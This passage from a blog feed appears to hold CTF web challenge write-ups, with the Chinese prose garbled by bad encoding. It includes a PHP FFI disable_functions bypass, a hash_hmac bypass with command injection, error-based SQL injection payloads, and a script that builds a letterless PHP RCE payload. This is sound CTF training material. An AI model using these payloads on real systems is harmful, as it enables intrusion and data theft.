class="headerlink" title="web77"></a>web77</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">$FFIè¯»å–</span><br><span class="line">c=$ffi = FFI::cdef(<span class="string">"int system(char *command);"</span>, <span class="string">"libc.so.6"</span>);$a=<span class="string">'/readflag &gt; xxx.txt'</span>;$ffi-&gt;system($a);<span class="keyword">exit</span>();   <span class="comment">//è®¿é—®xxx.txt</span></span><br><span class="line">æ”¾ä¸€ç¯‡æ–‡ç« ï¼šhttps:<span class="comment">//www.mi1k7ea.com/2019/06/07/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9C%8BPHP7-4%E7%9A%84FFI%E7%BB%95%E8%BF%87disable-functions/</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;commandç»•è¿‡&quot;&gt;&lt;a href=&quot;#commandç»•è¿‡&quot; class=&quot;headerlink&quot; title=&quot;commandç»•è¿‡&quot;&gt;&lt;/a&gt;commandç»•è¿‡
    
    </summary>
    
    
    
      <category term="show" scheme="http://yoursite.com/tags/show/"/>
    
  </entry>
  
  <entry>
    <title>ç¾ŠåŸæ¯2020</title>
    <link href="http://yoursite.com/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/"/>
    <id>http://yoursite.com/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/</id>
    <published>2020-09-11T05:49:10.000Z</published>
    <updated>2020-09-11T06:28:32.058Z</updated>
    
    <content type="html"><![CDATA[<h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“<a id="more"></a></h3><p>è¿™æ¬¡æ¯”èµ›ï¼Œåšäº†ä¿©webï¼Œæœ‰ä¸€é“webæ€»æ„Ÿè§‰å·®ç‚¹ï¼Œä¸€ä¸ªäººæ‰“å¾ˆåƒåŠ›ï¼Œæ²¡é˜Ÿå‹äº¤æµæ€è·¯ï¼Œè‡ªå·±è¿˜æ˜¯èƒ½åŠ›æ¬ ç¼ºäº†ï¼Œæ€»å½’è¿˜æ˜¯æœ‰æ”¶è·çš„</p><h3 id="easycon"><a href="#easycon" class="headerlink" title="easycon"></a>easycon</h3><h4 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h4><ul><li>å°é©¬</li><li>base64æœ¬åœ°è½¬å›¾ç‰‡</li></ul><h4 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h4><p>å¼€é¢˜</p><img src="/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/1.png" class=""><p>å°±æ˜¯ä¸€ä¸ªapacheçš„é…ç½®ä¿¡æ¯ï¼Œç›´æ¥æ”¹è®¿é—®index.php</p><img src="/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/2.png" class=""><p>æç¤ºpostä¸€ä¸ªcmdè¿‡å»ï¼Œçœ‹ä¸€ä¸‹ç½‘é¡µæºç </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"> <span class="selector-tag">div</span><span class="selector-class">.main</span> &#123; <span class="attribute">margin-left</span>:auto; <span class="attribute">margin-right</span>:auto;  &#125; <span class="selector-tag">body</span> &#123; <span class="attribute">background-color</span>: <span class="number">#FAEBA7</span>; &#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">title</span>&gt;</span></span><br><span class="line">       welcome to YCBCTF</span><br><span class="line">     <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">gw2.jpg</span>  <span class="attr">width</span>=<span class="string">49%</span> <span class="attr">height</span>=<span class="string">60%</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">gw.jpg</span>  <span class="attr">width</span>=<span class="string">49%</span> <span class="attr">height</span>=<span class="string">60%</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'eval post cmd'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>çŒœæµ‹æ˜¯ä¸€ä¸ªå¯ä»¥è¿æ¥çš„shellï¼Œç›´æ¥æ‹¿èšå‰‘è¿æ¥</p><img src="/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/3.png" class=""><p>è¿ä¸Šåæ‰¾äº†æ ¹ç›®å½•ï¼Œæ²¡æœ‰æ‰¾åˆ°flagï¼Œå‘ç°åœ¨webæœåŠ¡ç›®å½•ä¸‹è¿˜æœ‰ä¸€ä¸ªtxtæ–‡ä»¶ï¼Œä¸‹è½½åˆ°æœ¬åœ°ï¼Œbase64è§£ç å¯ä»¥çœ‹åˆ°jfifçŒœæµ‹æ˜¯å›¾ç‰‡ï¼Œä½†æ˜¯è§£çš„ç ä¸èƒ½è¿˜åŸæˆå›¾ç‰‡ï¼Œæƒ³åˆ°ä¹‹å‰åšè¿‡çš„é¢˜ç›®ï¼Œåœ¨æµè§ˆå™¨æ‰“å¼€æ—¶ä¹Ÿæ˜¯è¿™æ ·çš„å½¢å¼ï¼Œè‡ªå·±æœ¬åœ°å†™ä¸€ä¸ª</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;!DOCTYPE html&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"IE=edge"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">&lt;&lt;img src="data:image/png;base64,xxxxxxxxxxxxxx" alt=""&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æŠŠtxtæ–‡ä»¶ä¸­çš„å†…å®¹æ›¿æ¢åœ¨xxxxxxxxå¤„å³å¯ï¼Œå†æœ¬åœ°èµ·ä¸€ä¸‹ç½‘é¡µ</p><img src="/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/4.png" class=""><p>flagåˆ°æ‰‹</p><h3 id="BlackCat"><a href="#BlackCat" class="headerlink" title="BlackCat"></a>BlackCat</h3><h4 id="çŸ¥è¯†ç‚¹-1"><a href="#çŸ¥è¯†ç‚¹-1" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h4><ul><li>stringså‘½ä»¤</li><li><code>hash_hmac</code>ç»•è¿‡</li></ul><h4 id="è§£é¢˜æ­¥éª¤-1"><a href="#è§£é¢˜æ­¥éª¤-1" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h4><p>å¼€é¢˜</p><img src="/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/5.png" class=""><p>æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œæç¤ºå¬æ­Œï¼Œç›´æ¥æŠŠæ­Œä¸‹è¿‡æ¥ï¼Œä¸¢åˆ°kalié‡Œï¼Œç”¨stringså‘½ä»¤çœ‹ä¸€ä¸‹</p><img src="/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/6.png" class=""><p>å¯ä»¥çœ‹åˆ°æœ€åæœ‰æºç ï¼Œæ’•ä¸‹æ¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_POST[<span class="string">'Black-Cat-Sheriff'</span>]) || <span class="keyword">empty</span>($_POST[<span class="string">'One-ear'</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'è°ï¼ç«Ÿæ•¢è¸©æˆ‘ä¸€åªè€³çš„å°¾å·´ï¼'</span>);</span><br><span class="line">$clandestine = getenv(<span class="string">"clandestine"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'White-cat-monitor'</span>]))</span><br><span class="line">    $clandestine = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'White-cat-monitor'</span>], $clandestine);</span><br><span class="line">$hh = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'One-ear'</span>], $clandestine);</span><br><span class="line"><span class="keyword">if</span>($hh !== $_POST[<span class="string">'Black-Cat-Sheriff'</span>])&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">''</span>);</span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">"nc"</span>.$_POST[<span class="string">'One-ear'</span>]);</span><br></pre></td></tr></table></figure><p>è¦æƒ³æ‰§è¡Œåé¢çš„execï¼Œå°±å¾—ç»•è¿‡è¿™ä¸ªåˆ¤æ–­</p><p>æŸ¥æ‰¾èµ„æ–™ï¼Œæœ¬åœ°è°ƒè¯•ï¼Œå‘ç° <code>hash_hmac()</code>å‡½æ•°ä¼ å…¥çš„ç¬¬äºŒä¸ªå‚æ•°ä¸ºæ•°ç»„æ—¶ä¼šè¿”å›NULLï¼Œé‚£ä¹Ÿå°±æ˜¯è¯´åŠ å¯†ä¹‹åçš„<code>$clandestine</code>å¯æ§äº†ï¼ŒåŠ ä¸Š<code>$One-ear</code>å’Œ<code>$Black-Cat-Sheriff</code>éƒ½å¯æ§ï¼Œé‚£å°±ç®€å•äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$clandestine = hash_hmac(<span class="string">'sha256'</span>, $_GET[<span class="string">'2'</span>], $clandestine);</span><br><span class="line">var_dump($clandestine);</span><br><span class="line">$hh = hash_hmac(<span class="string">'sha256'</span>, $_GET[<span class="string">'1'</span>], $clandestine);</span><br><span class="line">var_dump($hh);</span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">"nc"</span>.$_GET[<span class="string">'cmd'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æœ¬åœ°è¿›è¡ŒåŠ å¯†ï¼Œå†è¿›è¡Œä¼ å‚ï¼Œè¿™é‡Œçš„<code>nc</code>å¼€å§‹æˆ‘ä»¥ä¸ºè¦è°ˆä¸ªshellåˆ°æœ¬åœ°ï¼Œè¯•äº†ä¸€ä¸‹ä¸è¡Œï¼Œåæ¥å‘ç°<code>;</code>å¯ä»¥é˜»æ–­<code>nc</code>å‘½ä»¤ï¼Œåé¢æ‹¼æ¥è‡ªå·±æƒ³è¦ä½¿ç”¨çš„å‘½ä»¤ï¼Œè¿™é‡Œç”±äºè¿”å›ç»“æœåªæœ‰ä¸€è¡Œï¼Œæ‰€ä»¥ç”¨<code>find</code>å‘½ä»¤æŸ¥æ‰¾flagæ–‡ä»¶å³å¯ï¼Œç›´æ¥ç»™æœ€åçš„ç»“æœå›¾</p><img src="/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/7.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;æ€»ç»“&quot;&gt;&lt;a href=&quot;#æ€»ç»“&quot; class=&quot;headerlink&quot; title=&quot;æ€»ç»“&quot;&gt;&lt;/a&gt;æ€»ç»“
    
    </summary>
    
    
    
      <category term="ç¾ŠåŸæ¯" scheme="http://yoursite.com/tags/%E7%BE%8A%E5%9F%8E%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>DASAugust</title>
    <link href="http://yoursite.com/2020/09/05/DASAugust/"/>
    <id>http://yoursite.com/2020/09/05/DASAugust/</id>
    <published>2020-09-05T07:53:00.000Z</published>
    <updated>2020-09-06T12:26:04.741Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å®‰æ’å¤§å­¦"><a href="#å®‰æ’å¤§å­¦" class="headerlink" title="å®‰æ’å¤§å­¦"></a>å®‰æ’å¤§å­¦<a id="more"></a></h2><h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul><li>SQLæŠ¥é”™æ³¨å…¥</li><li>æ³¨å…¥ç‚¹</li></ul><h3 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><p>å¼€é¢˜æ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢</p><img src="/2020/09/05/DASAugust/1.png" class=""><p>å¯ä»¥æ³¨å†Œï¼Œå¹¶ä¸”çœŸå®å‘é€é‚®ç®±æ¿€æ´»çš„é‚®ä»¶ï¼Œå¼€å§‹æ²¡æ³¨æ„è¿™é‡Œï¼Œåé¢å†è¯´</p><p>æ¿€æ´»ä¹‹åå°±å¯ä»¥ç™»å½•äº†</p><img src="/2020/09/05/DASAugust/2.png" class=""><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªæ•™åŠ¡ç³»ç»Ÿæœ‰å¾ˆå¤šçš„åŠŸèƒ½ï¼Œæ¯”èµ›é‚£å¤©æ‰¾äº†æŒºä¹…æ‰¾ä¸åˆ°åˆ©ç”¨çš„åœ°æ–¹ï¼Œ åˆæ²¡æœ‰åƒæ˜¯æ¨¡æ¿æ³¨å…¥çš„ç‚¹</p><p>èµ›åçœ‹å¸ˆå‚…çš„wpå°±æ˜¯åœ¨å‰é¢çš„å‘é€é‚®ç®±æ¿€æ´»çš„åœ°æ–¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;183.129.189.60:10048&#x2F;doAction.php?act&#x3D;active&amp;username&#x3D;pegggg&amp;token&#x3D;6011b0c07969fccb63b51daeaf1a4180</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„usernameå°±æ˜¯æ³¨å…¥ç‚¹ï¼Œä¹‹åå°±æ˜¯å¸¸è§„çš„æŠ¥é”™æ³¨å…¥ï¼Œå…ˆæ¥çœ‹ä¸€ä¸‹æ•°æ®åº“</p><img src="/2020/09/05/DASAugust/3.png" class=""><p>ä¸‹é¢å°±æ˜¯çœ‹è¡¨å’Œåˆ—åäº†</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">å…ˆæŸ¥è¡¨å</span><br><span class="line">1'and extractvalue(0x0a,concat(0x0a,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())))<span class="comment">--+</span></span><br><span class="line"><span class="comment">#XPATH syntax error: ' student,teachers,users'</span></span><br><span class="line"></span><br><span class="line">å¯ä»¥çœ‹åˆ°æœ‰ä¸‰ä¸ªè¡¨ï¼Œä¸€ä¸ªä¸ªçœ‹</span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">'and extractvalue(0x0a,concat(0x0a,(select group_concat(column_name) from information_schema.columns where table_name='</span><span class="keyword">users</span><span class="string">')))--+</span></span><br><span class="line"><span class="string">XPATH syntax error: '</span> <span class="keyword">id</span>,username,<span class="keyword">password</span>,ip,<span class="built_in">time</span>,US<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1'</span><span class="keyword">and</span> extractvalue(<span class="number">0x0a</span>,<span class="keyword">concat</span>(<span class="number">0x0a</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'teachers'</span>)))<span class="comment">--+</span></span><br><span class="line">XPATH syntax <span class="keyword">error</span>: <span class="string">' id,f1aaaag'</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">'and extractvalue(0x0a,concat(0x0a,(select group_concat(column_name) from information_schema.columns where table_name='</span>student<span class="string">')))--+</span></span><br><span class="line"><span class="string">XPATH syntax error: '</span> <span class="keyword">id</span>,username,age,sex<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">æ‰¾åˆ°äº†flagå­—æ®µï¼Œå°±æŸ¥teachersé‚£å¼ è¡¨å°±è¡Œ</span></span><br><span class="line"><span class="string">è¿™é‡Œå¾ˆæ˜æ˜¾æœ‰é•¿åº¦é™åˆ¶ï¼Œå¹¶ä¸”è¦æ³¨æ„ï¼Œè¿™é‡Œæœ‰å¾ˆå¤šå‡çš„flagæ•°æ®ï¼Œéœ€è¦é€æ¡æŸ¥è¯¢ï¼Œç”¨limit</span></span><br><span class="line"><span class="string">1'</span><span class="keyword">and</span> extractvalue(<span class="number">0x0a</span>,<span class="keyword">substr</span>((<span class="keyword">concat</span>(<span class="number">0x0a</span>,(<span class="keyword">select</span> f1aaaag <span class="keyword">from</span>  <span class="number">51</span>zxw.teachers <span class="keyword">limit</span> <span class="number">11</span>,<span class="number">1</span>))),<span class="number">1</span>,<span class="number">40</span>))<span class="comment">--+</span></span><br><span class="line">XPATH syntax <span class="keyword">error</span>: <span class="string">' DASCTF&#123;5af8b8860434db2184a427ee'</span></span><br><span class="line"><span class="number">1</span><span class="string">'and extractvalue(0x0a,substr((concat(0x0a,(select f1aaaag from  51zxw.teachers limit 11,1))),5,38))--+</span></span><br><span class="line"><span class="string">XPATH syntax error: '</span>af8b8860434db2184a427ee1fe6b845&#125;<span class="string">'</span></span><br></pre></td></tr></table></figure><img src="/2020/09/05/DASAugust/5.png" class=""><img src="/2020/09/05/DASAugust/4.png" class=""><p>æŠŠä¸Šé¢çš„ä¸¤éƒ¨åˆ†flagå»é‡æ‹¼æ¥å°±å¯ä»¥äº†</p><p>è¿™é‡Œä¹Ÿå¯ä»¥ç”¨reverseå€’å™è¾“å‡ºæ¥æ‹¿åˆ°åé¢éƒ¨åˆ†çš„flagï¼Œå†è¿›è¡Œæ‹¼æ¥</p><h2 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h2><h3 id="çŸ¥è¯†ç‚¹-1"><a href="#çŸ¥è¯†ç‚¹-1" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul><li>æ— å­—æ¯æ•°å­—RCE</li><li>æ•°å­—æ„é€ </li></ul><h3 id="è§£é¢˜æ­¥éª¤-1"><a href="#è§£é¢˜æ­¥éª¤-1" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><p>å¼€é¢˜æ”¾é€æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$code=$_POST[<span class="string">'code'</span>];</span><br><span class="line">$_=<span class="keyword">array</span>(<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'l'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'@'</span>,<span class="string">'\~'</span>,<span class="string">'\^'</span>,<span class="string">'\['</span>,<span class="string">'\]'</span>,<span class="string">'\&amp;'</span>,<span class="string">'\?'</span>,<span class="string">'\&lt;'</span>,<span class="string">'\&gt;'</span>,<span class="string">'\*'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>,<span class="string">'0'</span>);</span><br><span class="line"><span class="comment">//This blacklist is so stupid.</span></span><br><span class="line">$blacklist = array_merge($_);</span><br><span class="line"><span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blacklisted . <span class="string">'/im'</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'you are not smart'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"echo($code)"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ—¢ç„¶æ˜¯èµ›åå¤ç°ï¼Œé‚£è‚¯å®šæ˜¯çœ‹äº†wpçš„</p><p>è¿™é‡Œå¯ä»¥åˆ©ç”¨è¢«è¿‡æ»¤çš„å­—æ¯æ•°å­—å­˜æ”¾çš„æ•°ç»„æ¥è¿›è¡Œæ„é€ </p><p>æ­¤å¤–ï¼Œæ•°ç»„è‚¯å®šæ˜¯è¦æœ‰ä¸‹æ ‡çš„ï¼Œç„¶ååˆ©ç”¨é€’å¢å–åˆ°æƒ³è¦çš„å†…å®¹ï¼Œè¿™é‡Œç”¨çš„æ˜¯<code>(&quot;!=&quot;!=&quot;==&quot;)</code>ï¼Œè¿™æ˜¾ç¤ºä¸ºçœŸï¼Œphpä¸­æ‰“å°çš„ç»“æœä¸º1ï¼Œä¹‹åé€šè¿‡ç´¯åŠ å°±èƒ½æ‹¿åˆ°ä¸åŒçš„æ•°å­—äº†ï¼Œç›´æ¥ä¸Šexp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"><span class="keyword">list</span> =[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'l'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'@'</span>,<span class="string">'~'</span>,<span class="string">'^'</span>,<span class="string">'['</span>,<span class="string">']'</span>,<span class="string">'&amp;'</span>,<span class="string">'?'</span>,<span class="string">'&lt;'</span>,<span class="string">'&gt;'</span>,<span class="string">'*'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>,<span class="string">'0'</span>]</span><br><span class="line">long = len(<span class="keyword">list</span>)</span><br><span class="line">str1 = <span class="string">'system'</span></span><br><span class="line">str2 = <span class="string">'cat /flag'</span></span><br><span class="line">strings=<span class="string">''</span></span><br><span class="line">strings += <span class="string">"$__="</span></span><br><span class="line"><span class="keyword">for</span> j in str1:</span><br><span class="line">    <span class="keyword">if</span> j in <span class="keyword">list</span>:</span><br><span class="line">        strings += <span class="string">'$_&#123;'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">list</span>.index(j) ==<span class="number">0</span>:</span><br><span class="line">            strings += <span class="string">'("!="!="!=")&#125;.'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i in range(<span class="number">0</span>,<span class="keyword">list</span>.index(j)):</span><br><span class="line">                strings += <span class="string">'("!="!="==")+'</span></span><br><span class="line">            strings = strings[:<span class="number">-1</span>]</span><br><span class="line">            strings += <span class="string">'&#125;.'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        strings+=<span class="string">"\""</span>+j+<span class="string">"\"."</span></span><br><span class="line">    </span><br><span class="line">strings=strings[:<span class="number">-1</span>]+<span class="string">');'</span></span><br><span class="line"></span><br><span class="line">strings += <span class="string">"$___="</span></span><br><span class="line"><span class="keyword">for</span> j in str2:</span><br><span class="line">    <span class="keyword">if</span> j in <span class="keyword">list</span>:</span><br><span class="line">        strings += <span class="string">'$_&#123;'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">list</span>.index(j) ==<span class="number">0</span>:</span><br><span class="line">            strings += <span class="string">'("!="!="!=")&#125;.'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i in range(<span class="number">0</span>,<span class="keyword">list</span>.index(j)):</span><br><span class="line">                strings += <span class="string">'("!="!="==")+'</span></span><br><span class="line">            strings = strings[:<span class="number">-1</span>]</span><br><span class="line">            strings += <span class="string">'&#125;.'</span></span><br><span class="line">    <span 